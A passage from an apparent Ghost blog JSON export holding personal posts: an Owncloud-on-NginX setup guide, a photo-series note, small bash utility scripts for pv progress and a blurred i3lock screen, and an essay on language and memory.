[“if Is Evil”](https://www.nginx.com/resources/wiki/start/topics/depth/ifisevil/) in the NginX documentation, I left this part out, to no functionality detriment.\\n- Make the SSL modifications recommended in my [LetsEncrypt](https://blog.tams.tech/2017/02/letsencrypt-on-lemp-is-super-easy-but-not-really-obvious/) post.\\n- Add this line: add_header Strict-Transport-Security \\\"max-age=63072000; includeSubdomains; \\\";\\n- There are 7 lines of \\\"rewrite ^/(some stuff usually ending in dav)(.*)$ /remote.php/something$1 redirect;\\\"\\n\\nDelete those. Don’t use them.\\n- Inside of the “location ~ ^(.+?\\\\.php)(/.*?$ { }” block,  add a line that says “include fastcgi.conf;”\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>In the official documentation for NginX, there are instructions for setting up Owncloud on NginX. Unfortunately, they haven’t been updated since Owncloud 5; we’re now on Owncloud 9. Needless to say, a few things have changed. Also, before beginning, go through<a href=\"https://www.howtoforge.com/installing-nginx-with-php5-and-php-fpm-and-mysql-support-lemp-on-debian-wheezy\"> this guide</a> to setup PHP-FPM on your server, and to properly secure it. Consider this an edit to <a href=\"https://www.howtoforge.com/running-owncloud-5.0-on-nginx-lemp-on-debian-wheezy\">these</a> instructions.</p>\n<p>First, follow steps 1 and 2 on the howtoforge link as it applies to you. You should change your webroot from /var/www/ to something else. If you followed the first guide to get php-fpm configured, you should have most of the packages in step 2 already installed. The most important part of that is setting</p>\n<p>cgi.fix_pathinfo=0</p>\n<p>When you get to step 3 of the second howtoforge link, that’s when the significant changes come. The download link is obviously super out of date. Get the latest one at the <a href=\"https://owncloud.org/install/#edition\">owncloud download</a> page. Then, I used a more intuitive MySQL setup, based on my recent experience with WordPress installations. Run “mysql -u root -p”, then enter your password. You will be at the standard MySQL prompt. Enter the following commands:</p>\n<p>CREATE DATABASE owncloud; CREATE USER 'OCadmin'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON owncloud.* TO 'OCadmin'@'localhost'; FLUSH PRIVILEGES; quit</p>\n<p>Be sure to change ‘password’ to a randomly generated, high-entropy password, as I talked about in my post on <a href=\"https://blog.tams.tech/2016/12/finally-getting-around-to-proper-password-management/\">password management</a>. My terminal doesn’t seem to support high-ANSI characters, but anything else besides a single-quote is fair game with no backslash in that command, and there isn’t a length-limit that I know of, so your password can potentially be very high-entropy.</p>\n<p>Finally, there are some rather significant differences between today’s nginx configuration and the one recommended in the guide. The guide actually <em>caused</em> my owncloud to display improperly and not function correctly.</p>\n<ul>\n<li>Exclude the ‘if’ statement. After reading <a href=\"https://www.nginx.com/resources/wiki/start/topics/depth/ifisevil/\">“if Is Evil”</a> in the NginX documentation, I left this part out, to no functionality detriment.</li>\n<li>Make the SSL modifications recommended in my <a href=\"https://blog.tams.tech/2017/02/letsencrypt-on-lemp-is-super-easy-but-not-really-obvious/\">LetsEncrypt</a> post.</li>\n<li>Add this line: add_header Strict-Transport-Security &quot;max-age=63072000; includeSubdomains; &quot;;</li>\n<li>There are 7 lines of &quot;rewrite ^/(some stuff usually ending in dav)(.*)$ /remote.php/something$1 redirect;&quot;</li>\n</ul>\n<p>Delete those. Don’t use them.</p>\n<ul>\n<li>Inside of the “location ~ ^(.+?.php)(/.*?$ { }” block,  add a line that says “include fastcgi.conf;”</li>\n</ul>\n</div>","amp":"135","plaintext":"In the official documentation for NginX, there are instructions for setting up\nOwncloud on NginX. Unfortunately, they haven’t been updated since Owncloud 5;\nwe’re now on Owncloud 9. Needless to say, a few things have changed. Also,\nbefore beginning, go through  this guide\n[https://www.howtoforge.com/installing-nginx-with-php5-and-php-fpm-and-mysql-support-lemp-on-debian-wheezy] \n to setup PHP-FPM on your server, and to properly secure it. Consider this an\nedit to these\n[https://www.howtoforge.com/running-owncloud-5.0-on-nginx-lemp-on-debian-wheezy]\n instructions.\n\nFirst, follow steps 1 and 2 on the howtoforge link as it applies to you. You\nshould change your webroot from /var/www/ to something else. If you followed the\nfirst guide to get php-fpm configured, you should have most of the packages in\nstep 2 already installed. The most important part of that is setting\n\ncgi.fix_pathinfo=0\n\nWhen you get to step 3 of the second howtoforge link, that’s when the\nsignificant changes come. The download link is obviously super out of date. Get\nthe latest one at the owncloud download  page. Then, I used a more intuitive\nMySQL setup, based on my recent experience with WordPress installations. Run\n“mysql -u root -p”, then enter your password. You will be at the standard MySQL\nprompt. Enter the following commands:\n\nCREATE DATABASE owncloud; CREATE USER 'OCadmin'@'localhost' IDENTIFIED BY\n'password'; GRANT ALL PRIVILEGES ON owncloud.* TO 'OCadmin'@'localhost'; FLUSH\nPRIVILEGES; quit\n\nBe sure to change ‘password’ to a randomly generated, high-entropy password, as\nI talked about in my post on password management\n[https://blog.tams.tech/2016/12/finally-getting-around-to-proper-password-management/]\n. My terminal doesn’t seem to support high-ANSI characters, but anything else\nbesides a single-quote is fair game with no backslash in that command, and there\nisn’t a length-limit that I know of, so your password can potentially be very\nhigh-entropy.\n\nFinally, there are some rather significant differences between today’s nginx\nconfiguration and the one recommended in the guide. The guide actuallycaused  my\nowncloud to display improperly and not function correctly.\n\n * Exclude the ‘if’ statement. After reading “if Is Evil”\n   [https://www.nginx.com/resources/wiki/start/topics/depth/ifisevil/] in the\n   NginX documentation, I left this part out, to no functionality detriment.\n * Make the SSL modifications recommended in my LetsEncrypt\n   [https://blog.tams.tech/2017/02/letsencrypt-on-lemp-is-super-easy-but-not-really-obvious/]\n    post.\n * Add this line: add_header Strict-Transport-Security \"max-age=63072000;\n   includeSubdomains; \";\n * There are 7 lines of \"rewrite ^/(some stuff usually ending in dav)(.*)$\n   /remote.php/something$1 redirect;\"\n\nDelete those. Don’t use them.\n\n * Inside of the “location ~ ^(.+?.php)(/.*?$ { }” block,  add a line that says\n   “include fastcgi.conf;”","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-05T04:36:09.000Z","created_by":"1","updated_at":"2017-02-05T04:36:09.000Z","updated_by":"1","published_at":"2017-02-05T04:36:09.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332773","uuid":"0c7f06c8-e7c0-4df0-9a63-c760b94f3174","title":"Peace, Love and Happiness -- A Photo Series","slug":"peace-love-and-happiness-a-photo-series","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nThis was my first (and so far only) photo series. It was of a number of possibly-connected or perhaps independently-painted graffiitis along a common theme. I thought of it like a real-life meme; an idea that had taken over a few artists and compelled them to try to spread the message of peace, love, and happiness to the whole city. I don’t know if that’s really what happened, but the very idea makes me smile even now, over a year since I took these photos.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>This was my first (and so far only) photo series. It was of a number of possibly-connected or perhaps independently-painted graffiitis along a common theme. I thought of it like a real-life meme; an idea that had taken over a few artists and compelled them to try to spread the message of peace, love, and happiness to the whole city. I don’t know if that’s really what happened, but the very idea makes me smile even now, over a year since I took these photos.</p>\n</div>","amp":"146","plaintext":"This was my first (and so far only) photo series. It was of a number of\npossibly-connected or perhaps independently-painted graffiitis along a common\ntheme. I thought of it like a real-life meme; an idea that had taken over a few\nartists and compelled them to try to spread the message of peace, love, and\nhappiness to the whole city. I don’t know if that’s really what happened, but\nthe very idea makes me smile even now, over a year since I took these photos.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-07T12:49:36.000Z","created_by":"1","updated_at":"2017-02-07T12:49:36.000Z","updated_by":"1","published_at":"2017-02-07T12:49:36.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332774","uuid":"1b5b8d2a-a5e8-4fd9-b1f5-71b7d70c1508","title":"Another silly script to make things easier for me...","slug":"another-silly-script-to-make-things-easier-for-me","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nSo I use DD a decent amount, what with my Raspberry Pi and other various hardware that frequently needs a bootable disk. When I use DD, I always pipe it to ‘pv’ which passes data through itself (from stdin to stdout) and shows the progress of whatever data is passing through it. If you specify the ‘-s’ option, with a size, it shows a percentage of the completion based on the size specified.\\n\\nIn order to use that, I would have to run ‘ls -s’ and manually type the size in from the output. Well, I have done that one too many times! Today I wrote a quick script where instead of specifying the size of the file, you just tell it which file you’re working with and it shows the progress based on the size of that file. It naturally depends on the pv application and works with any application capable of piping through stdin and stdout, not just dd.\\n\\nI tried to include an error correction for the case where no file is mentioned to the script, but that doesn’t seem to work unfortunately. If anyone knows what I did wrong that would be really helpful.\\n\\n#!/bin/bash if [ -n \\\"$1\\\" ]; then echo \\\"$1 found\\\" pv -s $(stat --printf=\\\"%s\\\" $1) else echo \\\"$1 not found\\\" echo \\\"please include the file to determine the size\\\" fi\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>So I use DD a decent amount, what with my Raspberry Pi and other various hardware that frequently needs a bootable disk. When I use DD, I always pipe it to ‘pv’ which passes data through itself (from stdin to stdout) and shows the progress of whatever data is passing through it. If you specify the ‘-s’ option, with a size, it shows a percentage of the completion based on the size specified.</p>\n<p>In order to use that, I would have to run ‘ls -s’ and manually type the size in from the output. Well, I have done that one too many times! Today I wrote a quick script where instead of specifying the size of the file, you just tell it which file you’re working with and it shows the progress based on the size of that file. It naturally depends on the pv application and works with any application capable of piping through stdin and stdout, not just dd.</p>\n<p>I tried to include an error correction for the case where no file is mentioned to the script, but that doesn’t seem to work unfortunately. If anyone knows what I did wrong that would be really helpful.</p>\n<h1 id=\"binbashifn1thenecho1foundpvsstatprintfs1elseecho1notfoundechopleaseincludethefiletodeterminethesizefi\">!/bin/bash if [ -n &quot;$1&quot; ]; then echo &quot;$1 found&quot; pv -s $(stat --printf=&quot;%s&quot; $1) else echo &quot;$1 not found&quot; echo &quot;please include the file to determine the size&quot; fi</h1>\n</div>","amp":"156","plaintext":"So I use DD a decent amount, what with my Raspberry Pi and other various\nhardware that frequently needs a bootable disk. When I use DD, I always pipe it\nto ‘pv’ which passes data through itself (from stdin to stdout) and shows the\nprogress of whatever data is passing through it. If you specify the ‘-s’ option,\nwith a size, it shows a percentage of the completion based on the size\nspecified.\n\nIn order to use that, I would have to run ‘ls -s’ and manually type the size in\nfrom the output. Well, I have done that one too many times! Today I wrote a\nquick script where instead of specifying the size of the file, you just tell it\nwhich file you’re working with and it shows the progress based on the size of\nthat file. It naturally depends on the pv application and works with any\napplication capable of piping through stdin and stdout, not just dd.\n\nI tried to include an error correction for the case where no file is mentioned\nto the script, but that doesn’t seem to work unfortunately. If anyone knows what\nI did wrong that would be really helpful.\n\n!/bin/bash if [ -n \"$1\" ]; then echo \"$1 found\" pv -s $(stat --printf=\"%s\" $1)\nelse echo \"$1 not found\" echo \"please include the file to determine the size\" fi","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-09T02:59:12.000Z","created_by":"1","updated_at":"2017-02-09T02:59:12.000Z","updated_by":"1","published_at":"2017-02-09T02:59:12.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332775","uuid":"a5c56483-faf0-48f9-8f1f-26a59bb647fc","title":"\"Linguistics Is Broken\"","slug":"linguistics-is-broken","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nA good friend of mine said this to me the other day, and I immediately was very excited, because I knew we were about to have a *fascinating* discussion. What he went on to say was not fully formed, but he said before he started it wouldn’t be. The realization he’d come to was that no matter how well you define a word, some portion of the contextual meaning of that word is ‘lost in translation’, so to speak. In other words, when I say a certain word, the idea that you have that defines that word is close to, but not the same as the idea that I have that defines that word. Let me stop there and explain that concept a little better, then we’ll come back to why this is all so important.\\n\\nFirst of all, to understand why language as a form of interpersonal communication is broken, you have to understand a few things about how brains work, specifically human brains. Now, so that you understand my perspective, my understanding of brain science comes mostly from studies of neural network simulation in machine learning and mathematics. So, when I think of a neural net, I think of a matrix of probabilities, where the input is stimuli and the output is the probability that an organism, in this case a person, will react a certain way to those stimuli. Now, because we are dealing with literally [billions of features](https://www.verywell.com/how-many-neurons-are-in-the-brain-2794889) in that matrix, the responses to stimuli can be incredibly nuanced, especially considering that there isn’t a 1:1 ratio of neurons to memories; in fact, the capacity of neurally-structured memories is potentially infinite. Memories are stored in those probabilities, which are the strength and apparently distance of connections between neurons.\\n\\n(Let me take this opportunity to invite criticism to my argument from people who know brain science better than I)\\n\\nEvery time you receive new stimuli, it passes through that incredibly vast network of neurons, both creating a response and affecting future responses by influencing the connections between the nodes, or neurons. When you, as an adult, define a new word, you use the definitions of more common words to understand the meaning behind the new word. As it’s used in conversation, the new word takes on a definitive meaning, and this can vary from person to person.\\n\\nA good example of this is a common pet pronoun like *dog*, *cat*, or *mouse*. Some people have pet cats, some pet mice, some pet dogs. So when you, the reader, read the word *dog*, you picture a dog. In your mind, that dog may bring up feelings of love and companionship between you and a longtime pet dog. To me, it brings to mind the annoyance of a dog barking at the mailman, or the fear induced by an off-the-chain dog coming after you. Some people might be fearful or grossed out at the thought of the word *mouse*, while others have had pet mice that they hold fond memories of. Still others may have memories of a pet reptile eating live mice.\\n\\nThis is just one very obvious example. The point that my friend raised, and that I strongly agree with, is that this contextual meaning is present in tandem with the rigid, formal definition of a word. Let me try to explain.\\n\\nThere are two types of memory: semantic and episodic. The semantic memory is what I mean when I say the literal, formal, or dictionary definition of the word. It’s the intentionally-learned, factual knowledge that you seek out and store away in  your long-term memory. Both semantic and episodic memory contain several subsystems. For example, episodic memory conatains both your internalized storyline that you tell to yourself, and the summation of events in your life that you play back, as well as several other subsystems, like the quick playthrough you get when you recall a movie you’ve seen.\\n\\nThe fact that these subsystems exist separately (the semantic and episodic forms of long-term memory) seems at first to indicate that these are separate processes and that with enough semantic definition we can effectively communicate an idea. However, as the semantic memories are triggered, any episodic memories associated with that semantic memory are also automatically activated (see [this wikipedia](https://en.wikipedia.org/wiki/Semantic_memory#History) section, specifically the third paragraph). What this means is that there is a deeper context behind every word that we define in our language, something that can’t be defined by associating with other words, because each of those words is also defined by a deeper context defined by that episodic memory whenever it is triggered alongside the definition.\\n\\nPerhaps, if two people know each other *very very *well, they could learn to compensate for a large portion of this. In fact, some studies have shown that close friends or partners often forget knowledge that they know the other person will remember. This is also becoming an increasingly common phenomenon with people who use the internet and other electronic devices. Some people who use these devices very frequently find that they rely upon it for their daily function, like scheduling and trivial memories.\\n\\nBefore I go on to my proposed solution to this, I want to take a moment to discuss why this idea is important. To convey this idea I will use a word, and allow your personal context to define it, because I believe we all share a common experience that adequately defines the term for this context. The word is **misunderstanding**. Every time you’ve tried *so hard* to convey an idea to someone and yet they don’t seem to understand what you meant, is because their *deep* contextual definition of the term is different than your own. Well, perhaps not every time; many disagreements are caused by difference in experience that causes people who perfectly understand each other to disagree upon a conclusion. However, I would argue it’s the vast majority that are the former.\\n\\nNow, this finally leads me a way to solve the problem. This idea will be controversial, and may not come to be for a long time, but I believe that it is of the highest probability to lie within our currently progressing timeline, assuming we don’t annihilate ourselves. As we continue to rely and offload more and more of our memories to our computational devices that make up for our shortcomings, and as these devices become more and more directly connected to our natural neural structure, we will become less capable of individual memory and more and more dependent upon the electronic memory that is more dependable than our own. In this way our own brains, instead of remembering data itself, will simply remember pointers to data, allowing us to expand and unify definitions of the words we use and become a truly singular organism, one which can communicate effectively and make decisions for the betterment of the whole rather than the individual.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>A good friend of mine said this to me the other day, and I immediately was very excited, because I knew we were about to have a <em>fascinating</em> discussion. What he went on to say was not fully formed, but he said before he started it wouldn’t be. The realization he’d come to was that no matter how well you define a word, some portion of the contextual meaning of that word is ‘lost in translation’, so to speak. In other words, when I say a certain word, the idea that you have that defines that word is close to, but not the same as the idea that I have that defines that word. Let me stop there and explain that concept a little better, then we’ll come back to why this is all so important.</p>\n<p>First of all, to understand why language as a form of interpersonal communication is broken, you have to understand a few things about how brains work, specifically human brains. Now, so that you understand my perspective, my understanding of brain science comes mostly from studies of neural network simulation in machine learning and mathematics. So, when I think of a neural net, I think of a matrix of probabilities, where the input is stimuli and the output is the probability that an organism, in this case a person, will react a certain way to those stimuli. Now, because we are dealing with literally <a href=\"https://www.verywell.com/how-many-neurons-are-in-the-brain-2794889\">billions of features</a> in that matrix, the responses to stimuli can be incredibly nuanced, especially considering that there isn’t a 1:1 ratio of neurons to memories; in fact, the capacity of neurally-structured memories is potentially infinite. Memories are stored in those probabilities, which are the strength and apparently distance of connections between neurons.</p>\n<p>(Let me take this opportunity to invite criticism to my argument from people who know brain science better than I)</p>\n<p>Every time you receive new stimuli, it passes through that incredibly vast network of neurons, both creating a response and affecting future responses by influencing the connections between the nodes, or neurons. When you, as an adult, define a new word, you use the definitions of more common words to understand the meaning behind the new word. As it’s used in conversation, the new word takes on a definitive meaning, and this can vary from person to person.</p>\n<p>A good example of this is a common pet pronoun like <em>dog</em>, <em>cat</em>, or <em>mouse</em>. Some people have pet cats, some pet mice, some pet dogs. So when you, the reader, read the word <em>dog</em>, you picture a dog. In your mind, that dog may bring up feelings of love and companionship between you and a longtime pet dog. To me, it brings to mind the annoyance of a dog barking at the mailman, or the fear induced by an off-the-chain dog coming after you. Some people might be fearful or grossed out at the thought of the word <em>mouse</em>, while others have had pet mice that they hold fond memories of. Still others may have memories of a pet reptile eating live mice.</p>\n<p>This is just one very obvious example. The point that my friend raised, and that I strongly agree with, is that this contextual meaning is present in tandem with the rigid, formal definition of a word. Let me try to explain.</p>\n<p>There are two types of memory: semantic and episodic. The semantic memory is what I mean when I say the literal, formal, or dictionary definition of the word. It’s the intentionally-learned, factual knowledge that you seek out and store away in  your long-term memory. Both semantic and episodic memory contain several subsystems. For example, episodic memory conatains both your internalized storyline that you tell to yourself, and the summation of events in your life that you play back, as well as several other subsystems, like the quick playthrough you get when you recall a movie you’ve seen.</p>\n<p>The fact that these subsystems exist separately (the semantic and episodic forms of long-term memory) seems at first to indicate that these are separate processes and that with enough semantic definition we can effectively communicate an idea. However, as the semantic memories are triggered, any episodic memories associated with that semantic memory are also automatically activated (see <a href=\"https://en.wikipedia.org/wiki/Semantic_memory#History\">this wikipedia</a> section, specifically the third paragraph). What this means is that there is a deeper context behind every word that we define in our language, something that can’t be defined by associating with other words, because each of those words is also defined by a deeper context defined by that episodic memory whenever it is triggered alongside the definition.</p>\n<p>Perhaps, if two people know each other *very very *well, they could learn to compensate for a large portion of this. In fact, some studies have shown that close friends or partners often forget knowledge that they know the other person will remember. This is also becoming an increasingly common phenomenon with people who use the internet and other electronic devices. Some people who use these devices very frequently find that they rely upon it for their daily function, like scheduling and trivial memories.</p>\n<p>Before I go on to my proposed solution to this, I want to take a moment to discuss why this idea is important. To convey this idea I will use a word, and allow your personal context to define it, because I believe we all share a common experience that adequately defines the term for this context. The word is <strong>misunderstanding</strong>. Every time you’ve tried <em>so hard</em> to convey an idea to someone and yet they don’t seem to understand what you meant, is because their <em>deep</em> contextual definition of the term is different than your own. Well, perhaps not every time; many disagreements are caused by difference in experience that causes people who perfectly understand each other to disagree upon a conclusion. However, I would argue it’s the vast majority that are the former.</p>\n<p>Now, this finally leads me a way to solve the problem. This idea will be controversial, and may not come to be for a long time, but I believe that it is of the highest probability to lie within our currently progressing timeline, assuming we don’t annihilate ourselves. As we continue to rely and offload more and more of our memories to our computational devices that make up for our shortcomings, and as these devices become more and more directly connected to our natural neural structure, we will become less capable of individual memory and more and more dependent upon the electronic memory that is more dependable than our own. In this way our own brains, instead of remembering data itself, will simply remember pointers to data, allowing us to expand and unify definitions of the words we use and become a truly singular organism, one which can communicate effectively and make decisions for the betterment of the whole rather than the individual.</p>\n</div>","amp":"158","plaintext":"A good friend of mine said this to me the other day, and I immediately was very\nexcited, because I knew we were about to have afascinating  discussion. What he\nwent on to say was not fully formed, but he said before he started it wouldn’t\nbe. The realization he’d come to was that no matter how well you define a word,\nsome portion of the contextual meaning of that word is ‘lost in translation’, so\nto speak. In other words, when I say a certain word, the idea that you have that\ndefines that word is close to, but not the same as the idea that I have that\ndefines that word. Let me stop there and explain that concept a little better,\nthen we’ll come back to why this is all so important.\n\nFirst of all, to understand why language as a form of interpersonal\ncommunication is broken, you have to understand a few things about how brains\nwork, specifically human brains. Now, so that you understand my perspective, my\nunderstanding of brain science comes mostly from studies of neural network\nsimulation in machine learning and mathematics. So, when I think of a neural\nnet, I think of a matrix of probabilities, where the input is stimuli and the\noutput is the probability that an organism, in this case a person, will react a\ncertain way to those stimuli. Now, because we are dealing with literally\nbillions\nof features [https://www.verywell.com/how-many-neurons-are-in-the-brain-2794889]\n in that matrix, the responses to stimuli can be incredibly nuanced, especially\nconsidering that there isn’t a 1:1 ratio of neurons to memories; in fact, the\ncapacity of neurally-structured memories is potentially infinite. Memories are\nstored in those probabilities, which are the strength and apparently distance of\nconnections between neurons.\n\n(Let me take this opportunity to invite criticism to my argument from people who\nknow brain science better than I)\n\nEvery time you receive new stimuli, it passes through that incredibly vast\nnetwork of neurons, both creating a response and affecting future responses by\ninfluencing the connections between the nodes, or neurons. When you, as an\nadult, define a new word, you use the definitions of more common words to\nunderstand the meaning behind the new word. As it’s used in conversation, the\nnew word takes on a definitive meaning, and this can vary from person to person.\n\nA good example of this is a common pet pronoun like dog, cat, or mouse. Some\npeople have pet cats, some pet mice, some pet dogs. So when you, the reader,\nread the worddog, you picture a dog. In your mind, that dog may bring up\nfeelings of love and companionship between you and a longtime pet dog. To me, it\nbrings to mind the annoyance of a dog barking at the mailman, or the fear\ninduced by an off-the-chain dog coming after you. Some people might be fearful\nor grossed out at the thought of the word mouse, while others have had pet mice\nthat they hold fond memories of. Still others may have memories of a pet reptile\neating live mice.\n\nThis is just one very obvious example. The point that my friend raised, and that\nI strongly agree with, is that this contextual meaning is present in tandem with\nthe rigid, formal definition of a word. Let me try to explain.\n\nThere are two types of memory: semantic and episodic. The semantic memory is\nwhat I mean when I say the literal, formal, or dictionary definition of the\nword. It’s the intentionally-learned, factual knowledge that you seek out and\nstore away in  your long-term memory. Both semantic and episodic memory contain\nseveral subsystems. For example, episodic memory conatains both your\ninternalized storyline that you tell to yourself, and the summation of events in\nyour life that you play back, as well as several other subsystems, like the\nquick playthrough you get when you recall a movie you’ve seen.\n\nThe fact that these subsystems exist separately (the semantic and episodic forms\nof long-term memory) seems at first to indicate that these are separate\nprocesses and that with enough semantic definition we can effectively\ncommunicate an idea. However, as the semantic memories are triggered, any\nepisodic memories associated with that semantic memory are also automatically\nactivated (see this wikipedia  section, specifically the third paragraph). What\nthis means is that there is a deeper context behind every word that we define in\nour language, something that can’t be defined by associating with other words,\nbecause each of those words is also defined by a deeper context defined by that\nepisodic memory whenever it is triggered alongside the definition.\n\nPerhaps, if two people know each other *very very *well, they could learn to\ncompensate for a large portion of this. In fact, some studies have shown that\nclose friends or partners often forget knowledge that they know the other person\nwill remember. This is also becoming an increasingly common phenomenon with\npeople who use the internet and other electronic devices. Some people who use\nthese devices very frequently find that they rely upon it for their daily\nfunction, like scheduling and trivial memories.\n\nBefore I go on to my proposed solution to this, I want to take a moment to\ndiscuss why this idea is important. To convey this idea I will use a word, and\nallow your personal context to define it, because I believe we all share a\ncommon experience that adequately defines the term for this context. The word\nismisunderstanding. Every time you’ve triedso hard  to convey an idea to someone\nand yet they don’t seem to understand what you meant, is because theirdeep \ncontextual definition of the term is different than your own. Well, perhaps not\nevery time; many disagreements are caused by difference in experience that\ncauses people who perfectly understand each other to disagree upon a conclusion.\nHowever, I would argue it’s the vast majority that are the former.\n\nNow, this finally leads me a way to solve the problem. This idea will be\ncontroversial, and may not come to be for a long time, but I believe that it is\nof the highest probability to lie within our currently progressing timeline,\nassuming we don’t annihilate ourselves. As we continue to rely and offload more\nand more of our memories to our computational devices that make up for our\nshortcomings, and as these devices become more and more directly connected to\nour natural neural structure, we will become less capable of individual memory\nand more and more dependent upon the electronic memory that is more dependable\nthan our own. In this way our own brains, instead of remembering data itself,\nwill simply remember pointers to data, allowing us to expand and unify\ndefinitions of the words we use and become a truly singular organism, one which\ncan communicate effectively and make decisions for the betterment of the whole\nrather than the individual.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-09T05:36:22.000Z","created_by":"1","updated_at":"2017-02-09T05:36:22.000Z","updated_by":"1","published_at":"2017-02-09T05:36:22.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332776","uuid":"6f97887c-2692-4b1e-973e-b39d1c1970be","title":"A nice and simple script for a blurred-screen lockscreen","slug":"a-nice-and-simple-script-for-a-blurred-screen-lockscreen","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nSo I run [i3](http://i3wm.org/docs/) as my [desktop environment](https://en.wikipedia.org/wiki/Desktop_environment), with a few obvious additions considering how [barebones](http://i3wm.org/screenshots/#/screenshots/i3-5.png) it is. Most of my extras are from gnome, although I am always researching alternatives. Any, in my ~/.i3/config I have a keybinding set to my keyboard’s “sleep” button (XF86Sleep) which executes [i3lock](http://i3wm.org/i3lock/). Yesterday I wrote a simple script which blurs the screen instead of setting it to a solid color, like I have been. In fact, my roommate has mentioned a few times that just having a dark-green plain screen when I lock my computer looks “lame”.\\n\\nIt works very simply by using ImageMagick’s “[import](http://askubuntu.com/questions/194427/what-is-the-terminal-command-to-take-a-screenshot)” command to take a screenshot, and saves that to stdout. It then [pipes](https://en.wikipedia.org/wiki/Pipeline_(Unix)) that data to the ImageMagick “[convert](https://imagemagick.org/script/convert.php)” command, which is set to receive an image from stdin, and then [blur](https://imagemagick.org/script/command-line-options.php#blur) and apply other [obfusticating](https://imagemagick.org/script/command-line-options.php#level) effects. It saves that image as a single file which is replaced every time the script is run, then calls i3lock with that image. Check it out —\\n\\n#!/bin/bash import -window root - | convert -blur 3x1000 -level 0,85%,0.5 - /home/scott/.scripts/lockimg.png i3lock -i /home/scott/.scripts/lockimg.png\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>So I run <a href=\"http://i3wm.org/docs/\">i3</a> as my <a href=\"https://en.wikipedia.org/wiki/Desktop_environment\">desktop environment</a>, with a few obvious additions considering how <a href=\"http://i3wm.org/screenshots/#/screenshots/i3-5.png\">barebones</a> it is. Most of my extras are from gnome, although I am always researching alternatives. Any, in my ~/.i3/config I have a keybinding set to my keyboard’s “sleep” button (XF86Sleep) which executes <a href=\"http://i3wm.org/i3lock/\">i3lock</a>. Yesterday I wrote a simple script which blurs the screen instead of setting it to a solid color, like I have been. In fact, my roommate has mentioned a few times that just having a dark-green plain screen when I lock my computer looks “lame”.</p>\n<p>It works very simply by using ImageMagick’s “<a href=\"http://askubuntu.com/questions/194427/what-is-the-terminal-command-to-take-a-screenshot\">import</a>” command to take a screenshot, and saves that to stdout. It then <a href=\"https://en.wikipedia.org/wiki/Pipeline_(Unix)\">pipes</a> that data to the ImageMagick “<a href=\"https://imagemagick.org/script/convert.php\">convert</a>” command, which is set to receive an image from stdin, and then <a href=\"https://imagemagick.org/script/command-line-options.php#blur\">blur</a> and apply other <a href=\"https://imagemagick.org/script/command-line-options.php#level\">obfusticating</a> effects. It saves that image as a single file which is replaced every time the script is run, then calls i3lock with that image. Check it out —</p>\n<h1 id=\"binbashimportwindowrootconvertblur3x1000level08505homescottscriptslockimgpngi3lockihomescottscriptslockimgpng\">!/bin/bash import -window root - | convert -blur 3x1000 -level 0,85%,0.5 - /home/scott/.scripts/lockimg.png i3lock -i /home/scott/.scripts/lockimg.png</h1>\n</div>","amp":"161","plaintext":"So I run i3 [http://i3wm.org/docs/]  as my desktop environment\n[https://en.wikipedia.org/wiki/Desktop_environment], with a few obvious\nadditions considering how barebones  it is. Most of my extras are from gnome,\nalthough I am always researching alternatives. Any, in my ~/.i3/config I have a\nkeybinding set to my keyboard’s “sleep” button (XF86Sleep) which executes i3lock\n[http://i3wm.org/i3lock/]. Yesterday I wrote a simple script which blurs the\nscreen instead of setting it to a solid color, like I have been. In fact, my\nroommate has mentioned a few times that just having a dark-green plain screen\nwhen I lock my computer looks “lame”.\n\nIt works very simply by using ImageMagick’s “import\n[http://askubuntu.com/questions/194427/what-is-the-terminal-command-to-take-a-screenshot]\n” command to take a screenshot, and saves that to stdout. It then pipes\n[https://en.wikipedia.org/wiki/Pipeline_(Unix)]  that data to the ImageMagick “\nconvert [https://imagemagick.org/script/convert.php]” command, which is set to\nreceive an image from stdin, and then blur  and apply other obfusticating \neffects. It saves that image as a single file which is replaced every time the\nscript is run, then calls i3lock with that image. Check it out —\n\n!/bin/bash import -window root - | convert -blur 